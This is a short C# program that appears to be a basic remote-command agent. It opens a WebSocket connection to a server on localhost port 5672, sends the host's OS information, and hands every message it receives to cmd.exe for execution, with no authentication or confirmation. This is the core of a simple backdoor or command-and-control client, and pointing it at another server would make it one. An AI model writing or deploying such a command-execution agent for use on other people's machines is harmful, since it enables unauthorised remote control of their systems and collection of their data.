using System.Diagnostics;
using WebSocketSharp;
using UserInfo;

public class Program
{
    public static void Main(string[] args)
    {
        short port = 5672;
        string server = "ws://localhost";
        string connUrl = server + ":" + port;

        using var ws = new WebSocket(connUrl + "/");
        Console.WriteLine("Connected to the server");

        ws.OnMessage += (sender, e) =>
        {
            Console.WriteLine($"New comand: {e.Data}");
            RunComand(e.Data);
        };

        ws.Connect();

        ws.Send(GetUserData());

        Console.ReadKey(true);

        ws.Close();
    }

    public static void RunComand(string comand)
    {
        ProcessStartInfo startInfo = new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = comand,
            CreateNoWindow = false,
            UseShellExecute = true
        };
        
        Process.Start(startInfo);
    }

    public static string GetUserData()
    {
        Info info = new();

        #pragma warning disable CS8603
        return info.OS;
    }
}
